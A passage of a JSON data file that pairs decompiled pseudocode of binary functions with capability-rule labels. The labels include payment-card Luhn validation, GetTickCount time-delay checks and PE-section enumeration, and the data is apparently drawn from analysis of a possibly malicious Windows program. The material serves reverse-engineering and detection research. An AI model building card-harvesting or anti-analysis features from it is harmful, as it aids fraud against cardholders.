        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041c560(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_264h;\n    uint var_260h;\n    int32_t var_25ch;\n    int32_t var_258h;\n    uint32_t var_250h;\n    uint var_240h;\n    uint32_t var_23ch;\n    uint32_t var_234h;\n    uint var_224h;\n    uint32_t var_220h;\n    uint var_218h;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e856;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_258h = 0;\n    var_25ch = 0;\n    fcn.0042a6e0(&var_218h, 0, 0x104, var_10h);\n    uVar1 = fcn.00420a40(0x1c);\n    (**0x463038)(&var_218h, uVar1);\n    (**0x463038)(&var_218h, arg_8h);\n    fcn.0042a6e0(&var_114h, 0, 0x104);\n    (**0x463038)(&var_114h, &var_218h);\n    (**0x463038)(&var_114h, 0x445308);\n    (**0x463038)(&var_114h, *0x451e10);\n    var_220h = 0xf;\n    var_224h = 0;\n    var_234h = var_234h & 0xffffff00;\n    uVar1 = fcn.0042ad20(&var_114h);\n    fcn.004062a0(&var_114h, uVar1);\n    var_4h = 0;\n    puVar2 = fcn.00423d50(&var_250h, &var_234h);\n    var_4h = CONCAT31(var_4h._1_3_, 1);\n    if (7 < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    iVar3 = fcn.00420980(puVar2);\n    if (7 < var_23ch) {\n        fcn.0042a679(var_250h);\n    }\n    var_23ch = 7;\n    var_240h = 0;\n    var_250h = var_250h & 0xffff0000;\n    var_4h = 0xffffffff;\n    if (0xf < var_220h) {\n        fcn.0042a679(var_234h);\n    }\n    var_220h = 0xf;\n    var_224h = 0;\n    var_234h = var_234h & 0xffffff00;\n    if (iVar3 != 0) {\n        iVar3 = fcn.00419dc0(&var_114h, &var_258h, &var_25ch);\n        if (iVar3 == 0) {\n            fcn.00415510(&var_258h, &var_25ch);\n        }\n    }\n    puVar2 = &var_218h;\n    fcn.0041b3f0(0x4452bc, puVar2, arg_ch, var_258h, var_25ch, *(in_ECX + 0x20), arg_10h, 0);\n    if (*(in_ECX + 6) != '\\0') {\n        fcn.004174b0(&var_218h, arg_ch, 0);\n    }\n    if (var_258h != 0) {\n        (**0x462f7c)(var_258h, 0);\n        var_258h = 0;\n    }\n    if (var_25ch != 0) {\n        (**0x463030)(var_25ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(puVar2);\n    return;\n}\n",
        "token_count": 1005
    },
    "0041c7e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041c7e0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_370h;\n    uint var_36ch;\n    uint var_368h;\n    uint32_t var_364h;\n    int32_t var_360h;\n    int32_t var_35ch;\n    uint32_t var_354h;\n    uint var_344h;\n    uint32_t var_340h;\n    uint32_t var_338h;\n    uint var_328h;\n    uint32_t var_324h;\n    uint var_31ch;\n    uint var_218h;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e896;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_35ch = 0;\n    var_360h = 0;\n    fcn.0042a6e0(&var_218h, 0, 0x104, var_10h);\n    fcn.0042a6e0(&var_31ch, 0, 0x104);\n    uVar1 = fcn.00420a40(0x1a);\n    (**0x463038)(&var_218h, uVar1);\n    (**0x463038)(&var_218h, arg_8h);\n    (**0x463038)(&var_218h, arg_10h);\n    iVar2 = (**0x463068)(arg_10h, *0x45215c);\n    var_364h = iVar2 == 0;\n    iVar2 = (**0x463068)(arg_10h, *0x451bb8);\n    if (iVar2 == 0) {\n        var_364h = 2;\n    }\n    iVar2 = (**0x463068)(arg_10h, 0x447368);\n    if (iVar2 == 0) {\n        var_364h = 3;\n    }\n    uVar1 = fcn.00420a40(0x1a);\n    (**0x463038)(&var_31ch, uVar1);\n    (**0x463038)(&var_31ch, arg_8h);\n    fcn.0042a6e0(&var_114h, 0, 0x104);\n    (**0x463038)(&var_114h, &var_218h);\n    (**0x463038)(&var_114h, 0x445308);\n    (**0x463038)(&var_114h, *0x451e10);\n    var_324h = 0xf;\n    var_328h = 0;\n    var_338h = var_338h & 0xffffff00;\n    uVar1 = fcn.0042ad20(&var_114h);\n    fcn.004062a0(&var_114h, uVar1);\n    var_4h = 0;\n    puVar3 = fcn.00423d50(&var_354h, &var_338h);\n    var_4h = CONCAT31(var_4h._1_3_, 1);\n    if (7 < puVar3[5]) {\n        puVar3 = *puVar3;\n    }\n    iVar2 = fcn.00420980(puVar3);\n    if (7 < var_340h) {\n        fcn.0042a679(var_354h);\n    }\n    var_340h = 7;\n    var_344h = 0;\n    var_354h = var_354h & 0xffff0000;\n    var_4h = 0xffffffff;\n    if (0xf < var_324h) {\n        fcn.0042a679(var_338h);\n    }\n    var_324h = 0xf;\n    var_328h = 0;\n    var_338h = var_338h & 0xffffff00;\n    if ((iVar2 != 0) && (iVar2 = fcn.00419dc0(&var_114h, &var_35ch, &var_360h),  iVar2 == 0)) {\n        fcn.00415510(&var_35ch, &var_360h);\n    }\n    puVar3 = &var_218h;\n    fcn.0041b3f0(0x4452bc, puVar3, arg_ch, var_35ch, var_360h, *(in_ECX + 0x20), arg_14h, arg_18h);\n    if (*(in_ECX + 6) != '\\0') {\n        fcn.004174b0(&var_31ch, arg_ch, var_364h);\n    }\n    if (var_35ch != 0) {\n        (**0x462f7c)(var_35ch, 0);\n        var_35ch = 0;\n    }\n    if (var_360h != 0) {\n        (**0x463030)(var_360h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(puVar3);\n    return;\n}\n",
        "token_count": 1256
    },
    "0041cd90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nushort * fcn.0041cd90(int32_t param_1, int32_t param_2, ushort *param_3)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t var_8h;\n    int32_t var_ch_2;\n    ushort *var_10h_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43e901;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    var_4h._1_3_ = 0;\n    for (; var_8h != var_ch_2; var_8h = var_8h + 0x1c) {\n        var_4h._0_1_ = 1;\n        if (var_10h_2 != NULL) {\n            *(var_10h_2 + 10) = 7;\n            *(var_10h_2 + 8) = 0;\n            *var_10h_2 = 0;\n            fcn.0041a3a0(var_8h);\n        }\n        var_10h_2 = var_10h_2 + 0xe;\n    }\n    *in_FS_OFFSET = var_ch_3;\n    return var_10h_2;\n}\n",
        "token_count": 329
    },
    "0041d840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041d840(int32_t *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_8h;\n    uint var_10h;\n    uint var_ch;\n    int32_t arg_8h;\n    int32_t arg_ch;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e9c0;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    if (0x9249249 < var_8h) {\n        fcn.00429b7e(0x4452d8);\n    }\n    if ((param_1[2] - *param_1) / 0x1c < var_8h) {\n        iVar1 = fcn.00418aa0(var_8h);\n        var_4h = 0;\n        fcn.0041cd90(*param_1, param_1[1], iVar1, param_1 + 3, 0, var_8h);\n        arg_8h = *param_1;\n        iVar2 = param_1[1] - arg_8h;\n        if (arg_8h != 0) {\n            piVar3 = param_1 + 3;\n            arg_ch = param_1[1];\n            uVar4 = var_8h;\n            fcn.00412990(arg_8h, arg_ch);\n            fcn.0042a679(*param_1, arg_8h, arg_ch, piVar3, uVar4);\n        }\n        param_1[2] = iVar1 + var_8h * 0x1c;\n        param_1[1] = iVar1 + (iVar2 / 0x1c) * 0x1c;\n        *param_1 = iVar1;\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return;\n}\n",
        "token_count": 499
    },
    "0041d9e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041d9e0(int32_t param_1)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_4h_2;\n    uint var_8c0h;\n    uint var_8ach;\n    uint var_888h;\n    uint var_878h;\n    uint var_874h;\n    uint var_7e0h;\n    uint var_3f8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uchar *puVar6;\n    uint *in_stack_fffff6b0;\n    uint32_t noname_3;\n    uint *in_stack_fffff6b4;\n    int32_t in_stack_fffff6b8;\n    uint *in_stack_fffff6bc;\n    uint32_t in_stack_fffff6d8;\n    uint in_stack_fffff6dc;\n    uint in_stack_fffff6e0;\n    uint in_stack_fffff6e4;\n    uint var_8c0h_2;\n    uint *var_8bch_2;\n    uint *var_8b8h_2;\n    uint var_8b4h;\n    uint var_8b0h;\n    uint *var_8ach_3;\n    uint var_8a5h_2;\n    uint var_8bch;\n    uint32_t var_8b8h;\n    uint32_t var_888h_2;\n    uint var_8ach_2;\n    uint var_8a5h;\n    uint uStack2172;\n    uint32_t var_874h_2;\n    uint32_t var_86ch;\n    uint var_85ch;\n    uint32_t var_858h;\n    uint32_t var_850h;\n    uint var_840h;\n    uint32_t var_83ch;\n    uint32_t var_834h;\n    uint var_824h;\n    uint32_t var_820h;\n    uint32_t var_818h;\n    uint var_808h;\n    uint32_t var_804h;\n    uint32_t var_7fch;\n    uint *var_7f0h;\n    uint *var_7ech;\n    uint32_t var_7e8h;\n    uint var_7e0h_3;\n    uint var_7e0h_2;\n    uchar auStack1020 [40];\n    uint var_3f8h_2;\n    uint32_t var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_3;\n    \n    var_4h_3 = 0xffffffff;\n    uStack12 = 0x43ea85;\n    var_ch_2 = *in_FS_OFFSET;\n    var_10h_2 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch_2;\n    uVar1 = fcn.00420a40(0x1a);\n    var_874h_2 = 0xf;\n    uStack2172 = 0;\n    var_888h_2 = var_888h_2 & 0xffffff00;\n    uVar2 = fcn.0042ad20();\n    fcn.004062a0(uVar1, uVar2);\n    var_4h_3 = 0;\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    fcn.00420a40(0x1a);\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    fcn.00420a40(0x1a);\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    var_8ach_3 = &stack0xfffff6d8;\n    in_stack_fffff6d8 = in_stack_fffff6d8 & 0xffffff00;\n    uVar1 = fcn.0042ad20();\n    puVar6 = auStack1020;\n    fcn.004062a0(puVar6, uVar1);\n    fcn.004244f0(&var_8bch_2, puVar6, uVar1, in_stack_fffff6d8, in_stack_fffff6dc, in_stack_fffff6e0, in_stack_fffff6e4)\n    ;\n    var_4h_3._0_1_ = 1;\n    var_8ach_3 = var_8b8h_2;\n    puVar5 = var_8bch_2;\n    if (var_8bch_2 != var_8b8h_2) {\n        do {\n            var_7e8h = 7;\n            var_7ech = NULL;\n            var_7fch = var_7fch & 0xffff0000;\n            fcn.00412860(puVar5, 0, 0xffffffff);\n            in_stack_fffff6bc = &var_7fch;\n            in_stack_fffff6b8 = &var_8a5h_2 + 1;\n            var_4h_3._0_1_ = 2;\n            uVar1 = fcn.00423cb0(in_stack_fffff6b8, in_stack_fffff6bc);\n            in_stack_fffff6b0 = &var_888h_2;\n            var_4h_3._0_1_ = 3;\n            uVar2 = fcn.0040e740(&var_850h, in_stack_fffff6b0, *0x451f24);\n            var_4h_3._0_1_ = 4;\n            puVar3 = fcn.004064e0(&var_834h, uVar2, uVar1);\n            in_stack_fffff6b4 = &var_7fch;\n            var_4h_3._0_1_ = 5;\n            uVar1 = fcn.00423cb0(&var_86ch, in_stack_fffff6b4);\n            var_4h_3._0_1_ = 6;\n            puVar4 = fcn.00406490(&var_818h, *0x451d74, uVar1);\n            var_4h_3 = CONCAT31(var_4h_3._1_3_, 7);\n            if (0xf < puVar3[5]) {\n                puVar3 = *puVar3;\n            }\n            if (0xf < puVar4[5]) {\n                puVar4 = *puVar4;\n            }\n            fcn.004299c0(*(param_1 + 0x20), puVar4, puVar3);\n            if (0xf < var_804h) {\n                fcn.0042a679(var_818h);\n            }\n            var_804h = 0xf;\n            var_808h = 0;\n            var_818h = var_818h & 0xffffff00;\n            if (0xf < var_858h) {\n                fcn.0042a679(var_86ch);\n            }\n            var_858h = 0xf;\n            var_85ch = 0;\n            var_86ch = var_86ch & 0xffffff00;\n            if (0xf < var_820h) {\n                fcn.0042a679(var_834h);\n            }\n            var_820h = 0xf;\n            var_824h = 0;\n            var_834h = var_834h & 0xffffff00;\n            if (0xf < var_83ch) {\n                fcn.0042a679(var_850h);\n            }\n            var_83ch = 0xf;\n            var_840h = 0;\n            var_850h = var_850h & 0xffffff00;\n            if (0xf < var_8b8h) {\n                fcn.0042a679(stack0xfffff758);\n            }\n            var_4h_3._0_1_ = 1;\n            if (7 < var_7e8h) {\n                fcn.0042a679(var_7fch);\n            }\n            puVar5 = puVar5 + 7;\n        } while (puVar5 != var_8ach_3);\n    }\n    var_8ach_3 = &stack0xfffff6b0;\n    noname_3 = in_stack_fffff6b0 & 0xffffff00;\n    uVar1 = fcn.0042ad20(&var_7e0h_3);\n    puVar5 = &var_7e0h_3;\n    fcn.004062a0(puVar5, uVar1);\n    puVar5 = fcn.004244f0(&var_7f0h, puVar5, uVar1, noname_3, in_stack_fffff6b4, in_stack_fffff6b8, in_stack_fffff6bc);\n    if (&var_8bch_2 != puVar5) {\n        if (var_8bch_2 != NULL) {\n            puVar3 = &var_8b0h;\n            puVar4 = var_8bch_2;\n            puVar6 = var_8ach_3;\n            fcn.00412990(var_8bch_2, var_8b8h_2);\n            fcn.0042a679(var_8bch_2, puVar4, var_8b8h_2, puVar3, puVar6);\n        }\n        var_8bch_2 = *puVar5;\n        var_8b8h_2 = puVar5[1];\n        var_8b4h = puVar5[2];\n        *puVar5 = 0;\n        puVar5[1] = 0;\n        puVar5[2] = 0;\n    }\n    puVar3 = var_7ech;\n    var_4h_3 = CONCAT31(var_4h_3._1_3_, 1);\n    puVar5 = var_7f0h;\n    if (var_7f0h != NULL) {\n        for (; puVar5 != puVar3; puVar5 = puVar5 + 7) {\n            if (7 < puVar5[5]) {\n                fcn.0042a679(*puVar5);\n            }\n            puVar5[5] = 7;\n            puVar5[4] = 0;\n            *puVar5 = 0;\n        }\n        fcn.0042a679(var_7f0h);\n    }\n    var_8ach_3 = var_8b8h_2;\n    puVar5 = var_8bch_2;\n    if (var_8bch_2 != var_8b8h_2) {\n        do {\n            var_7fch = var_7fch & 0xffff0000;\n            var_7e8h = 7;\n            var_7ech = NULL;\n            fcn.00412860(puVar5, 0, 0xffffffff);\n            var_4h_3._0_1_ = 9;\n            uVar1 = fcn.00423cb0(&var_8a5h_2 + 1, &var_7fch);\n            var_4h_3._0_1_ = 10;\n            uVar2 = fcn.0040e740(&var_818h, &var_888h_2, *0x4520b8);\n            var_4h_3._0_1_ = 0xb;\n            puVar3 = fcn.004064e0(&var_86ch, uVar2, uVar1);\n            var_4h_3._0_1_ = 0xc;\n            uVar1 = fcn.00423cb0(&var_834h, &var_7fch);\n            var_4h_3._0_1_ = 0xd;\n            puVar4 = fcn.00406490(&var_850h, *0x451de8, uVar1);\n            var_4h_3 = CONCAT31(var_4h_3._1_3_, 0xe);\n            if (0xf < puVar3[5]) {\n                puVar3 = *puVar3;\n            }\n            if (0xf < puVar4[5]) {\n                puVar4 = *puVar4;\n            }\n            fcn.004299c0(*(param_1 + 0x20), puVar4, puVar3);\n            if (0xf < var_83ch) {\n                fcn.0042a679(var_850h);\n            }\n            var_83ch = 0xf;\n            var_840h = 0;\n            var_850h = var_850h & 0xffffff00;\n            if (0xf < var_820h) {\n                fcn.0042a679(var_834h);\n            }\n            var_820h = 0xf;\n            var_824h = 0;\n            var_834h = var_834h & 0xffffff00;\n            if (0xf < var_858h) {\n                fcn.0042a679(var_86ch);\n            }\n            var_858h = 0xf;\n            var_85ch = 0;\n            var_86ch = var_86ch & 0xffffff00;\n            if (0xf < var_804h) {\n                fcn.0042a679(var_818h);\n            }\n            var_804h = 0xf;\n            var_808h = 0;\n            var_818h = var_818h & 0xffffff00;\n            if (0xf < var_8b8h) {\n                fcn.0042a679(stack0xfffff758);\n            }\n            var_4h_3 = CONCAT31(var_4h_3._1_3_, 1);\n            if (7 < var_7e8h) {\n                fcn.0042a679(var_7fch);\n            }\n            puVar5 = puVar5 + 7;\n        } while (puVar5 != var_8ach_3);\n    }\n    puVar3 = var_8b8h_2;\n    puVar5 = var_8bch_2;\n    if (var_8bch_2 != NULL) {\n        for (; puVar5 != puVar3; puVar5 = puVar5 + 7) {\n            if (7 < puVar5[5]) {\n                fcn.0042a679(*puVar5);\n            }\n            puVar5[5] = 7;\n            puVar5[4] = 0;\n            *puVar5 = 0;\n        }\n        fcn.0042a679(var_8bch_2);\n    }\n    var_8bch_2 = NULL;\n    var_8b8h_2 = NULL;\n    var_8b4h = 0;\n    if (0xf < var_874h_2) {\n        fcn.0042a679(var_888h_2);\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042a75a(in_stack_fffff6b4);\n    return;\n}\n",
        "token_count": 3458
    },
    "0041e0c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_114h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041e0c0(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    char *extraout_ECX;\n    int32_t *in_FS_OFFSET;\n    uint32_t uStackY100912;\n    uint uStackY100896;\n    uint32_t uStackY100892;\n    uint32_t uStackY100884;\n    uint uStackY100868;\n    uint32_t uStackY100864;\n    uint32_t uStackY100856;\n    uint uStackY100840;\n    uint32_t uStackY100836;\n    uint32_t uStackY100828;\n    uint uStackY100812;\n    uint32_t uStackY100808;\n    uchar auStackY100800 [100000];\n    uint var_31ch;\n    uint uStackY712;\n    uint *puStackY708;\n    uint uStackY704;\n    uint *puStackY700;\n    uint uStackY696;\n    uint *puStackY692;\n    uint uStackY688;\n    uint *puStackY684;\n    uint uStackY680;\n    uint *puStackY676;\n    uint uStackY672;\n    uint *puStackY668;\n    uint uStackY664;\n    uint *puStackY660;\n    uint uStackY656;\n    uint *puStackY652;\n    uint uStackY648;\n    uint *puStackY644;\n    uint uStackY640;\n    uint *puStackY636;\n    uint uStackY632;\n    uint *puStackY628;\n    uint uStackY624;\n    uint *puStackY620;\n    uint uStackY616;\n    uint *puStackY612;\n    uint uStackY608;\n    uint *puStackY604;\n    uint uStackY600;\n    uint *puStackY596;\n    uint uStackY592;\n    uint *puStackY588;\n    uint uStackY584;\n    uint *puStackY580;\n    uint uStackY576;\n    uint *puStackY572;\n    uint uStackY568;\n    uint *puStackY564;\n    uint uStackY560;\n    uint *puStackY556;\n    uint uStackY552;\n    uint *puStackY548;\n    uint uStackY544;\n    uint *var_218h;\n    uint uStackY536;\n    uint *puStackY532;\n    uint uStackY528;\n    uint *puStackY524;\n    uint uStackY520;\n    uint *puStackY516;\n    uint uStackY512;\n    uint *puStackY508;\n    uint uStackY504;\n    uint *puStackY500;\n    uint uStackY496;\n    uint *puStackY492;\n    uint uStackY488;\n    uint *puStackY484;\n    uint uStackY480;\n    uint *puStackY476;\n    uint uStackY472;\n    uint *puStackY468;\n    uint uStackY464;\n    uint *puStackY460;\n    uint uStackY456;\n    uint *puStackY452;\n    uint uStackY448;\n    uint *puStackY444;\n    uint uStackY440;\n    uint *puStackY436;\n    uint uStackY432;\n    uint *puStackY428;\n    uint uStackY424;\n    uint *puStackY420;\n    uint uStackY416;\n    uint *puStackY412;\n    uint uStackY408;\n    uint *puStackY404;\n    uint uStackY400;\n    uint *puStackY396;\n    uint uStackY392;\n    uchar *arg_8h_00;\n    uint *var_114h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43eb08;\n    var_ch = *in_FS_OFFSET;\n    fcn.0042bc40();\n    *in_FS_OFFSET = &fcn.0041e0c0::var_ch;\n    fcn.0042a6e0();\n    *(extraout_ECX + 0xc) = 0;\n    *(extraout_ECX + 0x10) = 0;\n    *(extraout_ECX + 8) = 0;\n    *(extraout_ECX + 0x18) = 0;\n    *(extraout_ECX + 0x14) = 0;\n    *(extraout_ECX + 0x1c) = 0;\n    fcn.004180e0(arg_8h, arg_ch);\n    fcn.00417f30(*0x452040, *0x452230, &stack0xfffe7640);\n    fcn.00417f30(*0x451cac, *0x451fe4, &stack0xfffe7640);\n    fcn.0041c7e0(*0x452124, *0x451ec8, *0x45215c, &stack0xfffe7640, 0);\n    fcn.0041c7e0(*0x452124, *0x451ef0, *0x451bb8, &stack0xfffe7640, 0);\n    fcn.0041c7e0(*0x452124, 0x447b30, 0x447368, &stack0xfffe7640, 1);\n    fcn.0041c560(*0x451f04, *0x451f70, &stack0xfffe7640);\n    fcn.0041c560(*0x4521fc, *0x451d08, &stack0xfffe7640);\n    fcn.0041c560(*0x451ce8, *0x45208c, &stack0xfffe7640);\n    fcn.0041c560(*0x451fc4, *0x451f74, &stack0xfffe7640);\n    fcn.0041c560(*0x452370, *0x451f9c, &stack0xfffe7640);\n    fcn.0041c560(*0x451b64, *0x452278, &stack0xfffe7640);\n    fcn.0041c560(*0x451f3c, *0x4521a0, &stack0xfffe7640);\n    fcn.0041c560(*0x452168, *0x451b70, &stack0xfffe7640);\n    fcn.0041c560(*0x451d28, *0x451f38, &stack0xfffe7640);\n    fcn.0041c560(*0x451d48, *0x451ca4, &stack0xfffe7640);\n    fcn.0041c560(*0x451ff0, *0x451f2c, &stack0xfffe7640);\n    fcn.0041c560(*0x451b90, *0x4522ac, &stack0xfffe7640);\n    fcn.0041c560(*0x451c80, *0x451bcc, &stack0xfffe7640);\n    var_114h = *0x452378;\n    fcn.0041c560(*0x4520f8, *0x452378, &stack0xfffe7640);\n    fcn.0041c560(*0x452118, *0x451c60, &stack0xfffe7640);\n    fcn.0041c560(*0x451b3c, *0x452248, &stack0xfffe7640);\n    fcn.0041c560(*0x4521c4, *0x451be8, &stack0xfffe7640);\n    arg_8h_00 = 0x41e3ae;\n    fcn.0041c560(*0x451bac, *0x451dd0, &stack0xfffe7640);\n    if (*extraout_ECX != '\\0') {\n        arg_8h_00 = 0x41e3b9;\n        fcn.0041d9e0();\n        if (*extraout_ECX != '\\0') {\n            arg_8h_00 = &stack0xfffe7640;\n            fcn.0041bef0(arg_8h_00);\n            fcn.00417f30(*0x451fd4, *0x451d44, &stack0xfffe7640);\n            fcn.0041ce40();\n        }\n    }\n    if (extraout_ECX[5] != '\\0') {\n        fcn.0042a6e0();\n        fcn.0042a6e0();\n        fcn.0042a6e0();\n        uStackY392 = 0x41e43b;\n        fcn.00420a40(0x1a);\n        (**0x463038)();\n        (**0x463038)();\n        (**0x463038)();\n        (**0x463038)();\n        uStackY392 = 0x41e494;\n        (**0x463038)();\n        uStackY392 = 0x447138;\n        puStackY396 = &fcn.0041e0c0::var_114h;\n        uStackY400 = 0x41e4a6;\n        (**0x463038)();\n        uStackY400 = 0x447b28;\n        puStackY404 = &fcn.0041e0c0::var_114h;\n        uStackY408 = 0x41e4b8;\n        (**0x463038)();\n        uStackY408 = 0x4477b0;\n        puStackY412 = &fcn.0041e0c0::var_114h;\n        uStackY416 = 0x41e4ca;\n        (**0x463038)();\n        uStackY416 = 0x447140;\n        puStackY420 = &fcn.0041e0c0::var_114h;\n        uStackY424 = 0x41e4dc;\n        (**0x463038)();\n        uStackY424 = 0x447b24;\n        puStackY428 = &fcn.0041e0c0::var_114h;\n        uStackY432 = 0x41e4ee;\n        (**0x463038)();\n        uStackY432 = 0x4472e0;\n        puStackY436 = &fcn.0041e0c0::var_114h;\n        uStackY440 = 0x41e500;\n        (**0x463038)();\n        uStackY440 = 0x447b20;\n        puStackY444 = &fcn.0041e0c0::var_114h;\n        uStackY448 = 0x41e512;\n        (**0x463038)();\n        uStackY448 = 0x447138;\n        puStackY452 = &fcn.0041e0c0::var_114h;\n        uStackY456 = 0x41e524;\n        (**0x463038)();\n        uStackY456 = 0x447130;\n        puStackY460 = &fcn.0041e0c0::var_114h;\n        uStackY464 = 0x41e536;\n        (**0x463038)();\n        uStackY464 = 0x447b1c;\n        puStackY468 = &fcn.0041e0c0::var_114h;\n        uStackY472 = 0x41e548;\n        (**0x463038)();\n        uStackY472 = 0x447134;\n        puStackY476 = &fcn.0041e0c0::var_114h;\n        uStackY480 = 0x41e55a;\n        (**0x463038)();\n        uStackY480 = 0x4477ac;\n        puStackY484 = &fcn.0041e0c0::var_114h;\n        uStackY488 = 0x41e56c;\n        (**0x463038)();\n        uStackY488 = 0x4477b4;\n        puStackY492 = &fcn.0041e0c0::var_114h;\n        uStackY496 = 0x41e57e;\n        (**0x463038)();\n        uStackY496 = 0x445308;\n        puStackY500 = &fcn.0041e0c0::var_114h;\n        uStackY504 = 0x41e590;\n        (**0x463038)();\n        uStackY504 = 0x447b1c;\n        puStackY508 = &fcn.0041e0c0::var_31ch;\n        uStackY512 = 0x41e5a2;\n        (**0x463038)();\n        uStackY512 = 0x447138;\n        puStackY516 = &fcn.0041e0c0::var_31ch;\n        uStackY520 = 0x41e5b4;\n        (**0x463038)();\n        uStackY520 = 0x447b18;\n        puStackY524 = &fcn.0041e0c0::var_31ch;\n        uStackY528 = 0x41e5c6;\n        (**0x463038)();\n        uStackY528 = 0x44733c;\n        puStackY532 = &fcn.0041e0c0::var_31ch;\n        uStackY536 = 0x41e5d8;\n        (**0x463038)();\n        uStackY536 = 0x447b14;\n        var_218h = &fcn.0041e0c0::var_31ch;\n        uStackY544 = 0x41e5ea;\n        (**0x463038)();\n        uStackY544 = 0x447140;\n        puStackY548 = &fcn.0041e0c0::var_31ch;\n        uStackY552 = 0x41e5fc;\n        (**0x463038)();\n        uStackY552 = 0x447134;\n        puStackY556 = &fcn.0041e0c0::var_31ch;\n        uStackY560 = 0x41e60e;\n        (**0x463038)();\n        uStackY560 = 0x447140;\n        puStackY564 = &fcn.0041e0c0::var_31ch;\n        uStackY568 = 0x41e620;\n        (**0x463038)();\n        uStackY568 = 0x447130;\n        puStackY572 = &fcn.0041e0c0::var_31ch;\n        uStackY576 = 0x41e632;\n        (**0x463038)();\n        uStackY576 = 0x447b20;\n        puStackY580 = &fcn.0041e0c0::var_218h;\n        uStackY584 = 0x41e644;\n        (**0x463038)();\n        uStackY584 = 0x447b10;\n        puStackY588 = &fcn.0041e0c0::var_218h;\n        uStackY592 = 0x41e656;\n        (**0x463038)();\n        uStackY592 = 0x447b0c;\n        puStackY596 = &fcn.0041e0c0::var_218h;\n        uStackY600 = 0x41e668;\n        (**0x463038)();\n        uStackY600 = 0x447b0c;\n        puStackY604 = &fcn.0041e0c0::var_218h;\n        uStackY608 = 0x41e67a;\n        (**0x463038)();\n        uStackY608 = 0x447b08;\n        puStackY612 = &fcn.0041e0c0::var_218h;\n        uStackY616 = 0x41e68c;\n        (**0x463038)();\n        uStackY616 = 0x447b0c;\n        puStackY620 = &fcn.0041e0c0::var_218h;\n        uStackY624 = 0x41e69e;\n        (**0x463038)();\n        uStackY624 = 0x447b10;\n        puStackY628 = &fcn.0041e0c0::var_218h;\n        uStackY632 = 0x41e6b0;\n        (**0x463038)();\n        uStackY632 = 0x447b04;\n        puStackY636 = &fcn.0041e0c0::var_218h;\n        uStackY640 = 0x41e6c2;\n        (**0x463038)();\n        uStackY640 = 0x447b20;\n        puStackY644 = &fcn.0041e0c0::var_218h;\n        uStackY648 = 0x41e6d4;\n        (**0x463038)();\n        uStackY648 = 0x447b00;\n        puStackY652 